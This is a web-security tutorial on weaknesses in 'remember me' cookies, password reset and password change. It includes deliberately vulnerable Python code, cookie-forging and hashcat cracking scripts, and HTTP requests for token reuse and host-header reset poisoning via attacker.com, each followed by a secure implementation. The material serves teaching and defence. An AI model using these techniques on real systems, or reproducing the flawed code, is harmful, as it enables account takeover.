# Vulnerabilities in other authentication mechanisms

While primary login pages receive security scrutiny, supplementary authentication features like "remember me" cookies, password reset, and password change often contain critical vulnerabilities. Attackers who can create accounts can study these mechanisms extensively, discovering predictable patterns, logic flaws, and bypasses that grant access without knowing passwords.

These supplementary features are high-value targets because they're designed to bypass normal authentication, making them attractive attack vectors for account takeover.

> Only test systems you own or are explicitly authorized to assess.

## "Remember me" / "Stay logged in" vulnerabilities

### The feature: Persistent authentication cookies

When users check "Remember me," websites generate persistent cookies that bypass login for weeks or months. If poorly implemented, these cookies can be predicted, cracked, or forged.

### Vulnerability 1: Predictable cookie generation

#### Weak implementation (MD5 hash of username):

```python
# VULNERABLE: Predictable cookie
def create_remember_me_cookie(username):
    cookie = hashlib.md5(username.encode()).hexdigest()
    response.set_cookie('remember-me', cookie, max_age=2592000)  # 30 days
    return cookie
```

Cookie for user "carlos":
```text
remember-me=d0970714757783e6cf17b26fb8e2298f
```

**Exploitation:**
```python
import hashlib

# Attacker creates account, observes their cookie
attacker_username = "attacker"
attacker_cookie = "8e01e0020f958462ee47d96dd87c91d7"

# Verify pattern
if hashlib.md5(attacker_username.encode()).hexdigest() == attacker_cookie:
    print("[+] Cookie is MD5 of username!")
    
    # Generate cookie for victim
    victim_username = "carlos"
    victim_cookie = hashlib.md5(victim_username.encode()).hexdigest()
    print(f"[+] Victim's cookie: {victim_cookie}")
    
    # Use to hijack account
    requests.get("https://target.com/my-account", 
                 cookies={'remember-me': victim_cookie})
```

#### Weak implementation (Base64 encoded username:password):

```python
# VULNERABLE: Reversible encoding
def create_remember_me_cookie(username, password):
    cookie_value = f"{username}:{password}"
    cookie = base64.b64encode(cookie_value.encode()).decode()
    response.set_cookie('remember-me', cookie, max_age=2592000)
    return cookie
```

Cookie example:
```text
remember-me=Y2FybG9zOnBhc3N3b3JkMTIz
```

**Exploitation:**
```python
import base64

# Decode cookie
cookie = "Y2FybG9zOnBhc3N3b3JkMTIz"
decoded = base64.b64decode(cookie).decode()
print(f"[+] Decoded: {decoded}")  # carlos:password123

# Password revealed in plaintext!
```

#### Weak implementation (MD5 of username:password):

```python
# VULNERABLE: Hash without salt
def create_remember_me_cookie(username, password):
    cookie = hashlib.md5(f"{username}:{password}".encode()).hexdigest()
    response.set_cookie('remember-me', cookie, max_age=2592000)
    return cookie
```

Cookie for "carlos:password123":
```text
remember-me=3c744d4b49f2a3e6b98f2d84f4d8e19e
```

**Exploitation:**
```bash
# Brute-force with hashcat or john
echo "3c744d4b49f2a3e6b98f2d84f4d8e19e" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or online rainbow tables
# Google: "3c744d4b49f2a3e6b98f2d84f4d8e19e"
# Result: carlos:password123
```

### Exploitation workflow (brute-forcing stay-logged-in cookies):

**Step 1:** Create account and analyze your cookie:
```http
POST /login HTTP/1.1
Host: vulnerable.com

username=attacker&password=test123&stay-logged-in=on
```

Response:
```http
Set-Cookie: stay-logged-in=YXR0YWNrZXI6dGVzdDEyMw==
```

**Step 2:** Decode/analyze pattern:
```python
import base64
cookie = "YXR0YWNrZXI6dGVzdDEyMw=="
decoded = base64.b64decode(cookie).decode()
print(decoded)  # attacker:test123
```

Pattern identified: `base64(username:password)`

**Step 3:** Generate cookies for target user with common passwords:
```python
import base64

def generate_cookie(username, password):
    return base64.b64encode(f"{username}:{password}".encode()).decode()

target = "carlos"
with open('passwords.txt') as f:
    for password in f:
        password = password.strip()
        cookie = generate_cookie(target, password)
        print(cookie)
```

**Step 4:** Brute-force with Burp Intruder:
```http
GET /my-account HTTP/1.1
Host: vulnerable.com
Cookie: stay-logged-in=§payload§
```

Payload list: Pre-generated cookies for carlos with common passwords.

**Step 5:** Successful cookie grants access without login page rate limiting.

### Secure "remember me" implementation:

```python
import secrets
import hashlib
from datetime import datetime, timedelta

def create_secure_remember_me_token(user_id):
    # Generate cryptographically secure random token
    token = secrets.token_urlsafe(32)
    
    # Hash token for storage (never store plaintext)
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # Store in database with expiration
    db.insert_remember_me_token(
        user_id=user_id,
        token_hash=token_hash,
        created_at=datetime.now(),
        expires_at=datetime.now() + timedelta(days=30),
        device_fingerprint=get_device_fingerprint(),
        ip_address=request.remote_addr
    )
    
    # Set cookie (send unhashed token to client)
    response.set_cookie(
        'remember-me',
        token,
        max_age=2592000,  # 30 days
        httponly=True,
        secure=True,
        samesite='Strict'
    )
    
    return token

def verify_remember_me_token(token):
    if not token:
        return None
    
    # Hash provided token
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # Look up in database
    record = db.get_remember_me_token(token_hash)
    
    if not record:
        return None
    
    # Check expiration
    if record.expires_at < datetime.now():
        db.delete_token(token_hash)
        return None
    
    # Check if device/IP match (optional additional security)
    if record.device_fingerprint != get_device_fingerprint():
        alert_security("Possible token theft", record.user_id)
        db.delete_token(token_hash)
        return None
    
    # Valid token - return user
    return db.get_user(record.user_id)
```

**Key principles:**
- Tokens are cryptographically random (unguessable)
- Tokens stored hashed (can't be stolen from database)
- Tokens expire (time-limited risk)
- One token per device (limits scope of compromise)
- Device fingerprinting (detects token theft)
- Secure cookie attributes (HttpOnly, Secure, SameSite)

## Password reset vulnerabilities

### Vulnerability 1: Password reset via email (persistent passwords)

**Bad practice:**
```python
# VULNERABLE: Sending passwords via email
def reset_password(email):
    user = db.get_user_by_email(email)
    new_password = generate_random_password()
    
    user.password = hash_password(new_password)
    db.save(user)
    
    send_email(email, f"Your new password is: {new_password}")
```

**Problems:**
- Password sent over insecure channel (email)
- Email stored indefinitely in inbox
- Email synced across devices (phone, laptop, etc.)
- Email accessible to anyone with email credentials
- No expiration on new password

### Vulnerability 2: Weak password reset tokens (predictable/guessable)

#### Predictable token (username-based):

```python
# VULNERABLE: Token derived from username
def request_password_reset(email):
    user = db.get_user_by_email(email)
    token = hashlib.md5(user.username.encode()).hexdigest()
    
    reset_url = f"https://site.com/reset?token={token}"
    send_email(email, reset_url)
```

**Exploitation:**
```python
import hashlib

# Generate reset token for any user
victim_username = "administrator"
token = hashlib.md5(victim_username.encode()).hexdigest()
reset_url = f"https://site.com/reset?token={token}"

# Visit URL to reset admin password
```

#### Weak token (sequential or timestamp-based):

```python
# VULNERABLE: Predictable sequential tokens
reset_token_counter = 1000

def request_password_reset(email):
    global reset_token_counter
    token = str(reset_token_counter)
    reset_token_counter += 1
    # ...
```

**Exploitation:** Brute-force tokens 1000, 1001, 1002... until valid.

### Vulnerability 3: User parameter in reset form (broken logic)

#### Vulnerable flow:

**Step 1:** Request reset for victim:
```http
POST /forgot-password HTTP/1.1

email=victim@example.com
```

**Step 2:** Attacker receives NO email (not their account), but can guess reset URL:
```http
GET /reset-password?token=abc123xyz HTTP/1.1
```

**Step 3:** Reset form submitted:
```http
POST /reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=abc123xyz&username=victim&new-password=hacked123&confirm-password=hacked123
```

**Vulnerable backend:**
```python
# VULNERABLE: Doesn't verify token belongs to username
def reset_password():
    token = request.form['token']
    username = request.form['username']  # Trusted from form!
    new_password = request.form['new-password']
    
    # Only checks if token exists, not which user it belongs to
    if db.token_exists(token):
        user = db.get_user(username)  # Uses attacker-supplied username
        user.password = hash_password(new_password)
        db.save(user)
        return "Password reset successful"
```

**Exploitation:**
```http
# Step 1: Request reset for your OWN account
POST /forgot-password HTTP/1.1
email=attacker@example.com

# Step 2: Check your email, get valid token
# Token: abc123xyz

# Step 3: Visit reset page with YOUR token
GET /reset-password?token=abc123xyz HTTP/1.1

# Step 4: Submit form with VICTIM's username
POST /reset-password HTTP/1.1

token=abc123xyz&username=administrator&new-password=pwned123
```

Result: Admin password changed using attacker's token!

### Vulnerability 4: Token not validated on submission

```python
# VULNERABLE: Token only checked on GET, not POST
@app.route('/reset-password', methods=['GET'])
def show_reset_form():
    token = request.args.get('token')
    if db.valid_token(token):
        return render_template('reset.html', token=token)
    return error("Invalid token")

@app.route('/reset-password', methods=['POST'])
def reset_password():
    # BUG: Doesn't verify token again!
    username = request.form['username']
    new_password = request.form['new-password']
    
    user = db.get_user(username)
    user.password = hash_password(new_password)
    db.save(user)
```

**Exploitation:**
```http
# Request reset for your account to get valid token
POST /forgot-password HTTP/1.1
email=attacker@example.com

# Visit reset page with your token (passes GET check)
GET /reset-password?token=valid_attacker_token HTTP/1.1

# Submit form WITHOUT token, or with deleted token, changing username
POST /reset-password HTTP/1.1

username=victim&new-password=hacked&token=
```

### Vulnerability 5: Password reset poisoning

**Concept:** Manipulate Host header to receive victim's reset token.

Vulnerable code:
```python
def request_password_reset(email):
    user = db.get_user_by_email(email)
    token = generate_secure_token()
    
    # BUG: Uses Host header to build URL
    host = request.headers.get('Host')
    reset_url = f"https://{host}/reset?token={token}"
    
    send_email(user.email, f"Reset your password: {reset_url}")
```

**Exploitation:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

Victim receives email:
```text
Reset your password: https://attacker.com/reset?token=victim_secret_token
```

Victim clicks link → attacker receives token in server logs.

**Alternative with X-Forwarded-Host:**
```http
POST /forgot-password HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

email=victim@example.com
```

### Secure password reset implementation:

```python
import secrets
from datetime import datetime, timedelta

def request_password_reset(email):
    user = db.get_user_by_email(email)
    
    # ALWAYS return same message (prevent enumeration)
    message = "If account exists, password reset email sent"
    
    if user:
        # Generate cryptographically secure token
        token = secrets.token_urlsafe(32)
        
        # Store hashed token with metadata
        db.store_reset_token(
            user_id=user.id,
            token_hash=hashlib.sha256(token.encode()).hexdigest(),
            created_at=datetime.now(),
            expires_at=datetime.now() + timedelta(hours=1),
            used=False
        )
        
        # Invalidate previous tokens
        db.invalidate_old_tokens(user.id)
        
        # Build URL from trusted config, NOT headers
        reset_url = f"{settings.BASE_URL}/reset?token={token}"
        
        send_email(user.email, f"Reset link (expires in 1 hour): {reset_url}")
        
        # Log event
        log_security_event('password_reset_requested', user.id, request.remote_addr)
    
    return message

def reset_password():
    token = request.form['token']
    new_password = request.form['new-password']
    
    # Hash token for lookup
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    # Get token record
    reset_record = db.get_reset_token(token_hash)
    
    if not reset_record:
        return error("Invalid or expired reset link")
    
    # Verify token hasn't expired
    if reset_record.expires_at < datetime.now():
        db.delete_token(token_hash)
        return error("Reset link has expired")
    
    # Verify token hasn't been used
    if reset_record.used:
        return error("Reset link already used")
    
    # Validate new password
    if not is_strong_password(new_password):
        return error("Password too weak")
    
    # Get user FROM TOKEN (not from form!)
    user = db.get_user(reset_record.user_id)
    
    # Reset password
    user.password = hash_password(new_password)
    db.save(user)
    
    # Mark token as used
    reset_record.used = True
    db.save(reset_record)
    
    # Invalidate all sessions
    invalidate_all_sessions(user.id)
    
    # Log event
    log_security_event('password_reset_completed', user.id)
    
    # Notify user
    send_email(user.email, "Your password was changed")
    
    return success("Password reset successful")
```

## Password change vulnerabilities

### Vulnerability 1: No current password verification

```python
# VULNERABLE: Allows password change without current password
@app.route('/change-password', methods=['POST'])
def change_password():
    user_id = session['user_id']
    new_password = request.form['new_password']
    
    # BUG: Doesn't verify current password
    user = db.get_user(user_id)
    user.password = hash_password(new_password)
    db.save(user)
    
    return "Password changed"
```

**Exploitation:** If attacker gains temporary session access (XSS, CSRF, open browser), they can permanently change password.

### Vulnerability 2: Username in hidden field

```python
# VULNERABLE: Username in client-controlled field
@app.route('/change-password', methods=['POST'])
def change_password():
    username = request.form['username']  # From hidden field!
    current_password = request.form['current_password']
    new_password = request.form['new_password']
    
    user = db.get_user(username)
    if verify_password(user, current_password):
        user.password = hash_password(new_password)
        db.save(user)
```

**Exploitation:**
```http
POST /change-password HTTP/1.1

username=administrator&current_password=guess123&new_password=hacked
```

Can enumerate users and brute-force passwords via password change, not login!

### Vulnerability 3: Username enumeration via different responses

```python
# VULNERABLE: Different responses leak info
@app.route('/change-password', methods=['POST'])
def change_password():
    username = request.form['username']
    current_password = request.form['current_password']
    new_password = request.form['new_password']
    
    user = db.get_user(username)
    
    if not user:
        return "User not found"  # Leaks existence
    
    if not verify_password(user, current_password):
        return "Current password incorrect"  # Confirms user exists
    
    user.password = hash_password(new_password)
    return "Password changed"
```

**Exploitation:** Enumerate valid usernames, then brute-force via password change.

### Secure password change implementation:

```python
@app.route('/change-password', methods=['POST'])
def change_password():
    # Get user from authenticated session (not form)
    if not session.get('user_id'):
        return redirect('/login')
    
    user = db.get_user(session['user_id'])
    
    current_password = request.form['current_password']
    new_password = request.form['new_password']
    confirm_password = request.form['confirm_password']
    
    # Verify current password
    if not verify_password(user, current_password):
        return error("Current password incorrect")
    
    # Verify new passwords match
    if new_password != confirm_password:
        return error("Passwords don't match")
    
    # Validate new password strength
    if not is_strong_password(new_password):
        return error("New password too weak")
    
    # Prevent password reuse
    if check_password_history(user, new_password):
        return error("Cannot reuse recent password")
    
    # Change password
    user.password = hash_password(new_password)
    db.save(user)
    
    # Invalidate all other sessions
    invalidate_all_sessions_except_current(user.id, session['session_id'])
    
    # Log event
    log_security_event('password_changed', user.id)
    
    # Notify user via email
    send_email(user.email, "Your password was changed")
    
    return success("Password changed successfully")
```
